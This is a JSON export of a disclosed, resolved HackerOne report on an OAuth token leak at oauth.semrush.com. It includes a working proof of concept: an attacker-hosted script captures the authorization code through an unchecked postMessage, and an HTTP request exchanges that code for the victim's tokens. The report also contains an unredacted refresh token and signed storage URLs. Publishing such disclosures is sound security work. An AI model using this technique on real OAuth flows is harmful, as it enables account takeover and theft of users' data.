{
  "id": 314814,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTQ4MTQ=",
  "url": "https://hackerone.com/reports/314814",
  "title": "[oauth token leak] at oauth.semrush.com",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-02-10T19:34:59.147Z",
  "submitted_at": "2018-02-10T19:34:59.147Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "nikitastupin",
    "url": "/nikitastupin",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/oxy5KyvvNptCube1aM5Eq5tX/8774a5031fc14b74dc4404da039040c69df8ed41021007c0c2beb9de489fcf66"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15966,
    "url": "https://hackerone.com/semrush",
    "handle": "semrush",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/z5zlmceddsqb6x026x37tp0ych7i/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22Avatars.png%22%3B%20filename%2A%3DUTF-8%27%27Avatars.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3XLR7N3G%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T182705Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHYbqwGsx%2F1F3b8aclROyU%2BJGplp%2BIcEXI6gkgNpbH3PAiEAv3mYkmrN9%2FOkA9Z8VlIivtDz3TAT1wtfbjHsTsv%2FgfQqsQUIGhADGgwwMTM2MTkyNzQ4NDkiDD5EniDwglTlmmI9LCqOBbxx6hYN1Hgw6GTpdnIhGBNBbJYH7661Q2HO4K1jys89x%2B%2FkHOau7ZcpCJtR7v%2FX2WShXl%2F0mk9%2BqUY%2FajvoDXncZmPNBHQskq%2FgaHwPy5mi0hOrr75nlw3MenJgssyf4ek%2FWoK3inp8Sz%2BLam32A%2BvCI2HfSLHDAKoKSjf2u8Ik461ZwHDwSDkS9aPOZrGA3ySiQs01EV6q6TLdEy%2FQZ2Inh1jv5YPWf8DAwQJRlTK4BYe2DX5w%2F5iFsLIhd0AYyVv1M4iv2BWnIlkAnlii5e4FM49%2FgUsf5YNjVWsqy8J8S1Zz8YpQLB%2BcXsEjbDI%2Fjvmkoiwgsr%2FPfTLNhFtAHZyamw562RIVLR7EpNe0IzowAYF%2BrdpYKODLvnmed9MrNSS7BAH5aA37dV3p%2BDfvpzJhR2vKOLd2dDpjcG8UfvfsiGpsOReOcqZodwIKjjhQ0XS%2FBuSwRj4RTXazPlfiJRdL4CG%2BWtVZpqnUz8V1AUaA8bnHKd0y3sDeiTvX7FYP1%2B9urSiu7CMTm%2B6UCmUECa4bvVGCpSce15p4%2FkxDhK0Pv%2BpAPTlePrd8NA0a9yz72bcYLTO8EeUwDgLk1TZgAfAdcuflYq6cWxR1LqPj3V7CtZ8cYH9nduvsJx%2BlfKTZEn7bAfVUxOUli2cZgGbg5o5%2BNaxTM1ztn0ytOvv9CZmcVY7d4h9s30zqot%2BY%2Bg4wMxrO1vvYXyzjY6oEhfMZgIWPXWud449RM6LIUgPMtvhCUbK4SAEP6as0W6XqsPZwt%2FAL80dKBIk3d5drPdu40kEixXW8mOrr6hRpFrS3BnoYBTbrF4w0NvmkXVc0tCV%2BlkT637VEkx3ZzAq9NF4mdCdm4MS6KYkw%2Bqmta1sOLTCq0sDGBjqxAYen7tWjJJywewEXJwlL3Hh2z2gnC4me9E1lrlCGWv4aahToglVFCUILXiES7usgdtGR53xzvQ%2FlOIMuT2KC2svcHYBpcIkzvZ9yH9KeU0Gcg%2BMXz0YgukhGHIymyzld5x9X42VMVITBv2qXi8jHdA00JUaH0o7tBVJrp2kmx1GHziiDBVJ4xcNLxAAle%2BBlDr3NlVN%2ByeCrehBI84A97V%2F0ZkWTKywKEDwLxSv0JjSRpQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=533c16a8201efa98604deb2fa7eaf23fc69075e5b171ac848313f2047503570c",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/z5zlmceddsqb6x026x37tp0ych7i/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22Avatars.png%22%3B%20filename%2A%3DUTF-8%27%27Avatars.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3XLR7N3G%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T182705Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHYbqwGsx%2F1F3b8aclROyU%2BJGplp%2BIcEXI6gkgNpbH3PAiEAv3mYkmrN9%2FOkA9Z8VlIivtDz3TAT1wtfbjHsTsv%2FgfQqsQUIGhADGgwwMTM2MTkyNzQ4NDkiDD5EniDwglTlmmI9LCqOBbxx6hYN1Hgw6GTpdnIhGBNBbJYH7661Q2HO4K1jys89x%2B%2FkHOau7ZcpCJtR7v%2FX2WShXl%2F0mk9%2BqUY%2FajvoDXncZmPNBHQskq%2FgaHwPy5mi0hOrr75nlw3MenJgssyf4ek%2FWoK3inp8Sz%2BLam32A%2BvCI2HfSLHDAKoKSjf2u8Ik461ZwHDwSDkS9aPOZrGA3ySiQs01EV6q6TLdEy%2FQZ2Inh1jv5YPWf8DAwQJRlTK4BYe2DX5w%2F5iFsLIhd0AYyVv1M4iv2BWnIlkAnlii5e4FM49%2FgUsf5YNjVWsqy8J8S1Zz8YpQLB%2BcXsEjbDI%2Fjvmkoiwgsr%2FPfTLNhFtAHZyamw562RIVLR7EpNe0IzowAYF%2BrdpYKODLvnmed9MrNSS7BAH5aA37dV3p%2BDfvpzJhR2vKOLd2dDpjcG8UfvfsiGpsOReOcqZodwIKjjhQ0XS%2FBuSwRj4RTXazPlfiJRdL4CG%2BWtVZpqnUz8V1AUaA8bnHKd0y3sDeiTvX7FYP1%2B9urSiu7CMTm%2B6UCmUECa4bvVGCpSce15p4%2FkxDhK0Pv%2BpAPTlePrd8NA0a9yz72bcYLTO8EeUwDgLk1TZgAfAdcuflYq6cWxR1LqPj3V7CtZ8cYH9nduvsJx%2BlfKTZEn7bAfVUxOUli2cZgGbg5o5%2BNaxTM1ztn0ytOvv9CZmcVY7d4h9s30zqot%2BY%2Bg4wMxrO1vvYXyzjY6oEhfMZgIWPXWud449RM6LIUgPMtvhCUbK4SAEP6as0W6XqsPZwt%2FAL80dKBIk3d5drPdu40kEixXW8mOrr6hRpFrS3BnoYBTbrF4w0NvmkXVc0tCV%2BlkT637VEkx3ZzAq9NF4mdCdm4MS6KYkw%2Bqmta1sOLTCq0sDGBjqxAYen7tWjJJywewEXJwlL3Hh2z2gnC4me9E1lrlCGWv4aahToglVFCUILXiES7usgdtGR53xzvQ%2FlOIMuT2KC2svcHYBpcIkzvZ9yH9KeU0Gcg%2BMXz0YgukhGHIymyzld5x9X42VMVITBv2qXi8jHdA00JUaH0o7tBVJrp2kmx1GHziiDBVJ4xcNLxAAle%2BBlDr3NlVN%2ByeCrehBI84A97V%2F0ZkWTKywKEDwLxSv0JjSRpQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2b05d8e1484b1d724ce9d3bef213f9e4db387296d070495898439facc59b71d4"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Semrush",
      "twitter_handle": "",
      "website": "https://www.semrush.com/",
      "about": "Online Visibility Management Platform."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-04-17T11:58:56.526Z",
  "bug_reporter_agreed_on_going_public_at": "2018-03-20T14:44:51.228Z",
  "team_member_agreed_on_going_public_at": "2018-04-17T11:58:56.440Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Domain, site, application\n---\noauth.semrush.com\n\nSteps to reproduce\n---\n1) Create following html at attacker.com/postmessage.html\n\n```\n<script>\n  function listener(event) {\n    alert(JSON.stringify(event.data));\n  }\n\n  var dest = window.open(\"https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962\");\n  \n  window.addEventListener(\"message\", listener);\n</script>\n```\n2) Go to attacker.com/postmessage.html (make sure you are logged in at www.semrush.com)\n3) Click \"Approve\"\n4) Go to tab with attacker.com, you will see alert with `code`\n5) Make POST request with obtained `code`\n```\nPOST /oauth2/access_token HTTP/1.1\nHost: oauth.semrush.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: */*\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-type: application/x-www-form-urlencoded\nContent-Length: 205\nDNT: 1\nConnection: close\n\nclient_id=seoquake&client_secret=██████████&grant_type=authorization_code&code=[COPY OBTAINED CODE HERE]&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess\n```\n6) Receive response with `access token` and `refresh token`\n```\nHTTP/1.1 200 OK\nServer: nginx\nContent-Type: application/json\nConnection: close\nCache-Control: no-cache\nDate: Sat, 10 Feb 2018 19:06:38 GMT\nSet-Cookie: session=████; expires=Sat, 10-Feb-2018 21:06:38 GMT; Max-Age=7200; path=/; httponly\n\n{\"access_token\":\"███████\",\"token_type\":\"Bearer\",\"expires_in\":604800,\"refresh_token\":\"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC\"}\n```\n\nActual results\n---\n`access token` and `refresh token` of victim:\n```\n{\"access_token\":\"██████████\",\"token_type\":\"Bearer\",\"expires_in\":604800,\"refresh_token\":\"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC\"}\n```\n\nPoC, exploit code, screenshots, video, references, additional resources\n---\nThis vulnerability is possible due to lack of `window.opener` origin check at `https://oauth.semrush.com/oauth2/success`:\n```\n<script>\n\tif (window.opener && typeof opener.postMessage === 'function') {\n\t\topener.postMessage({ type: 'semrush:oauth:success', url: location.href }, '*');\n\t}\n</script>\n```\nMeaning any site that opens `https://oauth.semrush.com/oauth2/success` may read `code` in `location.href`.\n\nAttack vector based on fact that user sees SEOquake authorization page F262215 thinking that it's just official application permission request and with high probability clicks \"Approve\".\n\nStill working at vector without this small user interaction.\n\n## Impact\n\nOAuth tokens leakage. This leads to user sensitive information leakage.\n**Note**: it's not necessary to install SEOquake plugin!\n\nP.S.\n---\nI'm aware of user info leakage, project info leakage and Site Audit info leakage but maybe there is wider scope of possible sensitive info leak.\n\nI've reported vulnerability as soon as possible therefore no time to deeper scope research.",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 262215,
      "file_name": "approve.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/262/215/861594939f6e5cb9672825c39922437bb3c1ee1d/approve.png?response-content-disposition=attachment%3B%20filename%3D%22approve.png%22%3B%20filename%2A%3DUTF-8%27%27approve.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3XLR7N3G%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T182705Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHYbqwGsx%2F1F3b8aclROyU%2BJGplp%2BIcEXI6gkgNpbH3PAiEAv3mYkmrN9%2FOkA9Z8VlIivtDz3TAT1wtfbjHsTsv%2FgfQqsQUIGhADGgwwMTM2MTkyNzQ4NDkiDD5EniDwglTlmmI9LCqOBbxx6hYN1Hgw6GTpdnIhGBNBbJYH7661Q2HO4K1jys89x%2B%2FkHOau7ZcpCJtR7v%2FX2WShXl%2F0mk9%2BqUY%2FajvoDXncZmPNBHQskq%2FgaHwPy5mi0hOrr75nlw3MenJgssyf4ek%2FWoK3inp8Sz%2BLam32A%2BvCI2HfSLHDAKoKSjf2u8Ik461ZwHDwSDkS9aPOZrGA3ySiQs01EV6q6TLdEy%2FQZ2Inh1jv5YPWf8DAwQJRlTK4BYe2DX5w%2F5iFsLIhd0AYyVv1M4iv2BWnIlkAnlii5e4FM49%2FgUsf5YNjVWsqy8J8S1Zz8YpQLB%2BcXsEjbDI%2Fjvmkoiwgsr%2FPfTLNhFtAHZyamw562RIVLR7EpNe0IzowAYF%2BrdpYKODLvnmed9MrNSS7BAH5aA37dV3p%2BDfvpzJhR2vKOLd2dDpjcG8UfvfsiGpsOReOcqZodwIKjjhQ0XS%2FBuSwRj4RTXazPlfiJRdL4CG%2BWtVZpqnUz8V1AUaA8bnHKd0y3sDeiTvX7FYP1%2B9urSiu7CMTm%2B6UCmUECa4bvVGCpSce15p4%2FkxDhK0Pv%2BpAPTlePrd8NA0a9yz72bcYLTO8EeUwDgLk1TZgAfAdcuflYq6cWxR1LqPj3V7CtZ8cYH9nduvsJx%2BlfKTZEn7bAfVUxOUli2cZgGbg5o5%2BNaxTM1ztn0ytOvv9CZmcVY7d4h9s30zqot%2BY%2Bg4wMxrO1vvYXyzjY6oEhfMZgIWPXWud449RM6LIUgPMtvhCUbK4SAEP6as0W6XqsPZwt%2FAL80dKBIk3d5drPdu40kEixXW8mOrr6hRpFrS3BnoYBTbrF4w0NvmkXVc0tCV%2BlkT637VEkx3ZzAq9NF4mdCdm4MS6KYkw%2Bqmta1sOLTCq0sDGBjqxAYen7tWjJJywewEXJwlL3Hh2z2gnC4me9E1lrlCGWv4aahToglVFCUILXiES7usgdtGR53xzvQ%2FlOIMuT2KC2svcHYBpcIkzvZ9yH9KeU0Gcg%2BMXz0YgukhGHIymyzld5x9X42VMVITBv2qXi8jHdA00JUaH0o7tBVJrp2kmx1GHziiDBVJ4xcNLxAAle%2BBlDr3NlVN%2ByeCrehBI84A97V%2F0ZkWTKywKEDwLxSv0JjSRpQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6727cfade9033b5aa578198503eb5a47294f43ba2417105483cdf5347ddfbb9c",
      "file_size": 127890,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2018-04-19T14:44:51.341Z",
  "allow_singular_disclosure_after": -234330134.101036,
  "singular_disclosure_allowed": true,
  "vote_count": 67,
  "voters": [
    "jokebookservice1",
    "ronykroy",
    "iphoneintosh",
    "n1m0",
    "fdeleite",
    "inhibitor181",
    "muon4",
    "hunter",
    "bagipro",
    "tess",
    "and 57 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.4,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
